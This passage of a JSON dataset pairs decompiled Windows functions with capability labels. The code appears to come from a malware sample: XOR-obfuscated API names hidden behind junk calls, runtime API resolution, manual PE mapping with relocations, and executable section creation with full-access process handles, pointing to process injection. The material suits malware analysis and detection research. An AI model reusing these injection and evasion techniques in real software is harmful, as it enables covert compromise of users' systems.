        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00407a32(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    uint uVar6;\n    int32_t iVar7;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t lpModuleName;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_24h = 0x3b2f1723;\n    var_20h = 0x27076358;\n    var_1ch._0_2_ = 0x343b;\n    var_18h = 0x574b634d;\n    var_14h._0_1_ = 0x34;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    var_4h = 5;\n    iVar7 = 0;\n    var_8h = &var_24h - iVar2;\n    lpModuleName = iVar2;\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_CreateMenu)();\n        if (iVar3 != 0x86a4c2) {\n            *(iVar7 + iVar2) = *(&var_18h + iVar7 % var_4h) ^ (iVar7 + iVar2)[var_8h];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 10);\n    var_24h = 0xb2f0335;\n    var_20h = 0x2c13090c;\n    var_1ch._0_2_ = 0x6d34;\n    var_18h = 0x59437767;\n    var_14h._0_1_ = 0x6d;\n    uVar1 = (*pcVar5)(8, 0xb);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar7 = 0;\n    var_8h = &var_24h - iVar2;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n        iVar3 = lpModuleName;\n        if (iVar4 != 0xfb3e97) {\n            *(iVar7 + iVar2) = *(&var_18h + iVar7 % var_4h) ^ (iVar7 + iVar2)[&var_24h - iVar2];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 10);\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(lpModuleName, iVar2);\n    pcVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n    uVar1 = (*pcVar5)(var_10h);\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n    pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar6);\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n    (*pcVar5)(uVar6);\n    return uVar1;\n}\n",
        "token_count": 792
    },
    "00407b4d": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00407b4d(uint arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    uint uVar5;\n    int32_t iVar6;\n    uint in_EDX;\n    int32_t iVar7;\n    uint *puVar8;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    pcVar4 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_10h = 0;\n    puVar8 = &var_28h;\n    for (iVar6 = 8; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    var_3ch = 0x277d2c3b;\n    var_38h = 0x55312309;\n    var_34h = 0xb133631;\n    var_30h = 0x1c0d2555;\n    var_2ch._0_2_ = 0x5e37;\n    var_2ch._2_1_ = 0x46;\n    var_20h = 0x46305875;\n    var_1ch._0_1_ = 0x79;\n    var_14h = in_EDX;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x14);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    var_4h = 5;\n    iVar7 = 0;\n    var_8h = &var_3ch - iVar6;\n    var_ch = iVar6;\n    do {\n        iVar2 = (*_sym.imp.USER32.dll_GetCapture)();\n        if (iVar2 != 0xec5551) {\n            *(iVar7 + iVar6) = *(&var_20h + iVar7 % var_4h) ^ (iVar7 + iVar6)[var_8h];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x13);\n    var_34h = 0x3b2f1723;\n    var_30h = 0x27076358;\n    var_2ch._0_2_ = 0x343b;\n    var_20h = 0x574b634d;\n    var_1ch._0_1_ = 0x34;\n    uVar1 = (*pcVar4)(8, 0xb);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar7 = 0;\n    var_8h = &var_34h - iVar6;\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_CreateMenu)();\n        iVar2 = var_ch;\n        if (iVar3 != 0x86a4c2) {\n            *(iVar7 + iVar6) = *(&var_20h + iVar7 % var_4h) ^ (iVar7 + iVar6)[&var_34h - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 10);\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar6, var_ch);\n    pcVar4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n    (*pcVar4)(var_18h, var_14h, arg_8h, 0, 0, &var_28h, &var_10h, 2, 0, 0x40);\n    uVar1 = fcn.004078f9();\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n    pcVar4 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n    (*pcVar4)(uVar5);\n    return uVar1;\n}\n",
        "token_count": 1017
    },
    "00407ca9": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.00407ca9(uint param_1, uint param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    uint uVar6;\n    int32_t iVar7;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t lpLibFileName;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_24h = 0x3b2f1723;\n    var_20h = 0x27076358;\n    var_1ch._0_2_ = 0x343b;\n    var_18h = 0x574b634d;\n    var_14h._0_1_ = 0x34;\n    var_10h = param_2;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    var_4h = 5;\n    iVar7 = 0;\n    var_8h = &var_24h - iVar2;\n    lpLibFileName = iVar2;\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_CreateMenu)();\n        if (iVar3 != 0x86a4c2) {\n            *(iVar7 + iVar2) = *(&var_18h + iVar7 % var_4h) ^ (iVar7 + iVar2)[var_8h];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 10);\n    var_3ch = 0x21610227;\n    var_38h = 0x62060808;\n    var_34h = 0x391e0026;\n    var_30h = 0xa001c52;\n    var_2ch = 0xb205d02;\n    var_28h._0_1_ = 0x69;\n    var_18h = 0x4f347669;\n    var_14h._0_1_ = 0x65;\n    uVar1 = (*pcVar5)(8, 0x16);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar7 = 0;\n    var_8h = &var_3ch - iVar2;\n    do {\n        iVar4 = (*_sym.imp.ADVAPI32.dll_RevertToSelf)();\n        iVar3 = lpLibFileName;\n        if (iVar4 != 0xaae496) {\n            *(iVar7 + iVar2) = *(&var_18h + iVar7 % var_4h) ^ (iVar7 + iVar2)[&var_3ch - iVar2];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x15);\n    uVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, iVar2);\n    pcVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n    (*pcVar5)(0xffffffff, var_10h);\n    uVar1 = fcn.004078f9();\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n    pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar6);\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n    (*pcVar5)(uVar6);\n    return uVar1;\n}\n",
        "token_count": 909
    },
    "00407de0": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00407de0(int32_t *arg_8h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    int32_t iVar5;\n    uint *in_EDX;\n    int32_t iVar6;\n    uint *puVar7;\n    uchar *puVar8;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    int32_t var_2ch;\n    uint var_24h;\n    uint var_20h;\n    uint *var_1ch;\n    int32_t var_18h;\n    int32_t lpModuleName;\n    int32_t var_10h;\n    uchar *var_ch;\n    int32_t var_8h;\n    \n    var_8h = 0;\n    var_ch = NULL;\n    var_38h = 0x3b2f1723;\n    puVar7 = &var_54h;\n    var_1ch = in_EDX;\n    for (iVar5 = 0x18; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    var_34h = 0x27076358;\n    puVar7 = &var_2ch;\n    for (iVar5 = 8; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    puVar7 = &var_24h;\n    for (iVar5 = 8; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    var_30h = CONCAT22(var_30h._2_2_, 0x343b);\n    var_24h = 0x574b634d;\n    var_20h._0_1_ = 0x34;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n    iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    var_10h = 5;\n    iVar6 = 0;\n    lpModuleName = iVar5;\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_CreateMenu)();\n        if (iVar3 != 0x86a4c2) {\n            *(iVar6 + iVar5) = *(&var_24h + iVar6 % var_10h) ^ (iVar6 + iVar5)[&var_38h - iVar5];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 10);\n    var_3ch = 0x1b33047e;\n    var_38h = 0x1504512e;\n    var_34h = 0x4532e3a;\n    var_30h = 0x30250619;\n    var_24h = 0x69707030;\n    var_20h._0_1_ = 0x4b;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x11);\n    iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar6 = 0;\n    var_18h = &var_3ch - iVar5;\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_GetClipboardSequenceNumber)();\n        if (iVar3 != 0x5210d0) {\n            *(iVar6 + iVar5) = *(&var_24h + iVar6 % var_10h) ^ (iVar6 + iVar5)[&var_3ch - iVar5];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0x10);\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(lpModuleName, iVar5);\n    pcVar4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n    var_48h = 0x40;\n    var_54h = 0x18;\n    var_50h = 0;\n    var_4ch = 0;\n    var_44h = 0;\n    var_40h = 0;\n    iVar6 = (*pcVar4)(&var_8h, 0xf001f, &var_54h, &var_2ch, 0x40, 0x8000000, 0);\n    if (iVar6 < 0) {\n        iVar6 = fcn.004078f9();\n    }\n    else {\n        iVar6 = fcn.00407b4d(&var_ch);\n        puVar8 = var_ch;\n        var_10h = iVar6;\n        if (iVar6 == 0) {\n            for (; var_2ch != 0; var_2ch = var_2ch + -1) {\n                *puVar8 = 0;\n                puVar8 = puVar8 + 1;\n            }\n            *var_1ch = var_ch;\n            if (arg_8h != NULL) {\n                *arg_8h = var_8h;\n            }\n        }\n    }\n    if ((var_8h != 0) && (arg_8h == NULL)) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(var_8h);\n    }\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n    pcVar4 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    uVar2 = (*pcVar1)(0, lpModuleName);\n    (*pcVar4)(uVar2);\n    return iVar6;\n}\n",
        "token_count": 1386
    },
    "00407fb9": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00407fb9(uchar *arg_8h)\n\n{\n    uint32_t *puVar1;\n    uint16_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    uchar *in_ECX;\n    int32_t iVar9;\n    uint32_t uVar10;\n    int32_t *piVar11;\n    uchar *in_EDX;\n    int32_t *piVar12;\n    uchar *puVar13;\n    uchar *puVar14;\n    uint32_t uVar15;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar3 = *(in_EDX + 0x3c);\n    uVar2 = *(in_EDX + iVar3 + 0x14);\n    iVar7 = *(in_EDX + iVar3 + 0x3c);\n    uVar6 = *(in_EDX + iVar3 + 6);\n    puVar13 = in_EDX;\n    puVar14 = in_ECX;\n    for (iVar9 = *(in_EDX + iVar3 + 0x54); iVar9 != 0; iVar9 = iVar9 + -1) {\n        *puVar14 = *puVar13;\n        puVar13 = puVar13 + 1;\n        puVar14 = puVar14 + 1;\n    }\n    if (uVar6 != 0) {\n        piVar12 = in_EDX + uVar2 + 0x2c + iVar3;\n        do {\n            uVar10 = iVar7 + -1 + piVar12[-1] & ~(iVar7 - 1U);\n            if (uVar10 != 0) {\n                puVar13 = in_EDX + *piVar12;\n                puVar14 = in_ECX + piVar12[-2];\n                for (; uVar10 != 0; uVar10 = uVar10 - 1) {\n                    *puVar14 = *puVar13;\n                    puVar13 = puVar13 + 1;\n                    puVar14 = puVar14 + 1;\n                }\n            }\n            piVar12 = piVar12 + 10;\n            uVar6 = uVar6 - 1;\n        } while (uVar6 != 0);\n    }\n    puVar13 = in_ECX;\n    if (arg_8h != NULL) {\n        puVar13 = arg_8h;\n    }\n    iVar7 = 0xa0;\n    if (*(in_EDX + iVar3 + 4) == -0x799c) {\n        iVar7 = 0xb0;\n    }\n    if ((*(in_EDX + iVar7 + iVar3) != 0) && (uVar6 = *(in_EDX + iVar7 + 4 + iVar3),  uVar6 != 0)) {\n        if (*(in_EDX + iVar3 + 4) == -0x799c) {\n            iVar9 = *(in_EDX + iVar3 + 0x30);\n        }\n        else {\n            iVar9 = *(in_EDX + iVar3 + 0x34);\n        }\n        puVar14 = *(in_EDX + iVar3 + 0x30);\n        uVar10 = puVar13 - *(in_EDX + iVar3 + 0x30);\n        iVar4 = *(in_EDX + iVar3 + 0x34);\n        piVar12 = in_ECX + *(in_EDX + iVar7 + iVar3);\n        for (; 8 < uVar6; uVar6 = uVar6 - *piVar11) {\n            iVar3 = *piVar12;\n            uVar15 = piVar12[1] - 8U >> 1;\n            if ((piVar12[1] <= uVar6) && (uVar15 != 0)) {\n                piVar11 = piVar12 + 2;\n                do {\n                    uVar2 = *piVar11;\n                    if (uVar2 >> 0xc == 3) {\n                        *(in_ECX + (uVar2 & 0xfff) + iVar3) = puVar13 + (*(in_ECX + (uVar2 & 0xfff) + iVar3) - iVar9);\n                    }\n                    else if (uVar2 >> 0xc == 10) {\n                        uVar8 = uVar2 & 0xfff;\n                        puVar1 = in_ECX + uVar8 + iVar3;\n                        uVar5 = *puVar1;\n                        *puVar1 = *puVar1 + uVar10;\n                        *(in_ECX + uVar8 + 4 + iVar3) =\n                             *(in_ECX + uVar8 + 4 + iVar3) + (((puVar13 >> 0x1f) - iVar4) - (puVar13 < puVar14)) +\n                             CARRY4(uVar5, uVar10);\n                    }\n                    piVar11 = piVar11 + 2;\n                    uVar15 = uVar15 - 1;\n                } while (uVar15 != 0);\n            }\n            piVar11 = piVar12 + 1;\n            piVar12 = piVar12 + piVar12[1];\n        }\n    }\n    return 0;\n}\n",
        "token_count": 1190
    },
    "0040862a": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0040862a(uint arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    uint uVar6;\n    int32_t iVar7;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t lpModuleName;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_24h = 0x3b2f1723;\n    var_20h = 0x27076358;\n    var_1ch._0_2_ = 0x343b;\n    var_18h = 0x574b634d;\n    var_14h._0_1_ = 0x34;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    var_4h = 5;\n    iVar7 = 0;\n    var_8h = &var_24h - iVar2;\n    lpModuleName = iVar2;\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_CreateMenu)();\n        if (iVar3 != 0x86a4c2) {\n            *(iVar7 + iVar2) = *(&var_18h + iVar7 % var_4h) ^ (iVar7 + iVar2)[var_8h];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 10);\n    var_28h = 0x17350e1c;\n    var_24h = 0x8292801;\n    var_20h = 0xa230708;\n    var_1ch._0_2_ = 0x6709;\n    var_18h = 0x677a7946;\n    var_14h._0_1_ = 100;\n    uVar1 = (*pcVar5)(8, 0xf);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar7 = 0;\n    var_8h = &var_28h - iVar2;\n    do {\n        iVar4 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n        iVar3 = lpModuleName;\n        if (iVar4 != 0xc8433e) {\n            *(iVar7 + iVar2) = *(&var_18h + iVar7 % var_4h) ^ (iVar7 + iVar2)[&var_28h - iVar2];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0xe);\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(lpModuleName);\n    pcVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1, iVar2);\n    uVar1 = (*pcVar5)(var_10h, 0x1f0fff, arg_8h, arg_ch);\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n    pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar6);\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n    (*pcVar5)(uVar6);\n    return uVar1;\n}\n",
        "token_count": 838
    },
    "004087a4": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.004087a4(uint arg_8h, uint arg_ch)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t in_ECX;\n    uint *in_EDX;\n    int32_t iVar6;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_39h;\n    uint var_35h;\n    uint var_30h;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint *var_1ch;\n    int32_t lpModuleName;\n    int32_t var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0;\n    _var_30h = 0;\n    var_1ch = in_EDX;\n    var_4h = in_ECX;\n    if (in_ECX == -1) {\n        var_8h = 1;\n        (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n        var_4h = fcn.0040875b();\n    }\n    if (*0x41dadc == NULL) {\n        var_28h = 0x3b2f1723;\n        var_24h = 0x27076358;\n        var_20h._0_2_ = 0x343b;\n        var_14h = 0x574b634d;\n        var_10h._0_1_ = 0x34;\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n        iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        iVar6 = 0;\n        lpModuleName = iVar3;\n        var_ch = &var_28h - iVar3;\n        do {\n            iVar4 = (*_sym.imp.USER32.dll_CreateMenu)();\n            if (iVar4 != 0x86a4c2) {\n                var_ch = 5;\n                *(iVar6 + iVar3) = *(&var_14h + iVar6 % 5) ^ (iVar6 + iVar3)[&var_28h - iVar3];\n            }\n            iVar6 = iVar6 + 1;\n        } while (iVar6 < 10);\n        var_4ch = 0x9254213;\n        var_48h = 0x677d434f;\n        var_44h = 0x235c0717;\n        var_40h._0_2_ = 0x4720;\n        var_14h = 6;\n        var_40h._2_1_ = 6;\n        stack0xffffffbf = 0x4195913;\n        var_39h = 0x4a091f50;\n        var_35h = 0x72017f0c;\n        var_24h = 0x66723549;\n        var_20h._0_2_ = 0x7538;\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1c);\n        iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        iVar6 = 0;\n        var_ch = &var_4ch - iVar3;\n        do {\n            iVar5 = (*_sym.imp.USER32.dll_GetMessageExtraInfo)();\n            iVar4 = lpModuleName;\n            if (iVar5 != 0x65a5f) {\n                *(iVar6 + iVar3) = *(&var_24h + iVar6 % var_14h) ^ (iVar6 + iVar3)[&var_4ch - iVar3];\n            }\n            iVar6 = iVar6 + 1;\n        } while (iVar6 < 0x1b);\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(lpModuleName, iVar3);\n        *0x41dadc = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n        var_30h = 0;\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n        pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n        (*pcVar1)(uVar2);\n        iVar3 = var_4h;\n        in_EDX = var_1ch;\n        if (*0x41dadc == NULL) goto code_r0x00408946;\n    }\n    iVar3 = var_4h;\n    var_30h = 0;\n    iVar6 = (**0x41dadc)(var_4h, *in_EDX, in_EDX[1], arg_8h, arg_ch, 0, &var_30h);\n    if (-1 < iVar6) {\n    }\ncode_r0x00408946:\n    if (var_8h != 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar3);\n    }\n    return var_30h;\n}\n",
        "token_count": 1191
    },
    "0040895c": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0040895c(uint32_t arg_8h, uint32_t *arg_ch)\n\n{\n    char cVar1;\n    code *pcVar2;\n    uchar *arg_8h_00;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    int32_t *piVar9;\n    int32_t *in_EDX;\n    code *pcVar10;\n    int32_t iVar11;\n    uchar *puVar12;\n    int32_t *piVar13;\n    uint var_a8h;\n    uint var_a0h;\n    int32_t var_78h;\n    int32_t var_74h;\n    uint32_t var_70h;\n    int32_t *var_6ch;\n    int32_t var_68h;\n    int32_t var_64h;\n    uint var_60h;\n    int32_t var_5ch;\n    int32_t var_58h;\n    int32_t var_54h;\n    uint32_t var_50h;\n    uint var_4ch;\n    int32_t var_48h;\n    int32_t var_44h;\n    uint var_40h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uchar var_18h;\n    uint var_17h;\n    uchar *var_10h;\n    int32_t *var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    pcVar10 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_60h = 0;\n    var_58h = 0;\n    var_50h = 0;\n    var_48h = 0x3b2f1723;\n    var_44h = 0x27076358;\n    var_40h._0_2_ = 0x343b;\n    var_8h = 0x574b634d;\n    var_4h._0_1_ = 0x34;\n    var_6ch = in_EDX;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    var_ch = 0x5;\n    iVar11 = 0;\n    var_10h = &var_48h - iVar4;\n    var_5ch = iVar4;\n    do {\n        iVar5 = (*_sym.imp.USER32.dll_CreateMenu)();\n        if (iVar5 != 0x86a4c2) {\n            *(iVar11 + iVar4) = *(&var_8h + iVar11 % var_ch) ^ (iVar11 + iVar4)[var_10h];\n        }\n        iVar11 = iVar11 + 1;\n    } while (iVar11 < 10);\n    var_34h = 0xd1e403e;\n    var_30h = 0x18035204;\n    var_2ch = 0x4e161617;\n    var_28h = 0xb150c00;\n    var_24h = 0x7032445;\n    var_20h = 0x3227580d;\n    var_1ch = 0x2c540b01;\n    _var_18h = 0x3520011;\n    var_17h._3_1_ = 0x49;\n    var_8h = 0x62493764;\n    var_4h._0_1_ = 0x73;\n    uVar3 = (*pcVar10)(8, 0x22);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar11 = 0;\n    var_10h = &var_34h - iVar4;\n    var_68h = iVar4;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_DestroyCaret)();\n        iVar5 = var_5ch;\n        if (iVar6 != 0x33899b) {\n            *(iVar11 + iVar4) = *(&var_8h + iVar11 % var_ch) ^ var_10h[iVar11 + iVar4];\n        }\n        iVar11 = iVar11 + 1;\n    } while (iVar11 < 0x21);\n    if ((*0x41e218 & 1) == 0) {\n        *0x41e218 = *0x41e218 | 1;\n        *0x41e214 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(var_5ch);\n    }\n    if ((*0x41e218 & 2) == 0) {\n        *0x41e218 = *0x41e218 | 2;\n        *0x41e210 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(*0x41e214, iVar4);\n    }\n    if (*0x41e214 == 0) {\n        *0x41e214 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar5);\n    }\n    if (*0x41e210 == NULL) {\n        var_34h = 0xd1e403e;\n        var_30h = 0x18035204;\n        var_2ch = 0x4e161617;\n        var_28h = 0xb150c00;\n        var_24h = 0x7032445;\n        var_20h = 0x3227580d;\n        var_1ch = 0x2c540b01;\n        _var_18h = 0x3520011;\n        var_17h._3_1_ = 0x49;\n        var_8h = 0x62493764;\n        var_4h._0_1_ = 0x73;\n        uVar3 = (*pcVar10)(8, 0x22);\n        iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        iVar11 = 0;\n        var_10h = &var_34h - iVar4;\n        do {\n            iVar5 = (*_sym.imp.USER32.dll_DestroyCaret)();\n            if (iVar5 != 0x33899b) {\n                *(iVar11 + iVar4) = *(&var_8h + iVar11 % var_ch) ^ var_10h[iVar11 + iVar4];\n            }\n            iVar11 = iVar11 + 1;\n        } while (iVar11 < 0x21);\n        *0x41e210 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(*0x41e214, iVar4);\n        uVar3 = (*pcVar10)(0, iVar4);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        iVar5 = var_5ch;\n        iVar4 = var_68h;\n    }\n    fcn.00408234();\n    if ((*0x41e210 != NULL) && (iVar11 = (**0x41e210)(var_4ch, 0, &var_a8h, 0x30, &var_54h),  -1 < iVar11)) {\n        uVar3 = (*pcVar10)(8, 0x200);\n        var_10h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        if (var_10h != NULL) {\n            uVar3 = (*pcVar10)(8, 0x100);\n            iVar11 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n            if (((iVar11 != 0) && (var_54h = fcn.004087a4(iVar11, 0x28),  var_54h != 0)) &&\n               (var_54h 